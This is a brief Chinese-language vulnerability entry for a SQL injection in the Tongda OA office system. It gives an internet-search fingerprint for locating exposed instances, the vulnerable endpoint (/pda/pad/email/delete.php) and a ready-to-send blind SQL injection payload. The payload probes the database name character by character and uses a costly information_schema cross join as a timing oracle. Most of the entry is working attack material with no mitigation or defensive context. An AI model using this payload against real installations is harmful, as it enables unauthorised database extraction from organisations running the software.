# 通达OASQL注入漏洞

通达OA ｜ SQL注入 ｜ —
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /pda/pad/email/delete.php HTTP/1.1`

**Payload**
```
EMAIL_ID=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1&A=delbox
```
- **响应特征**：200 ok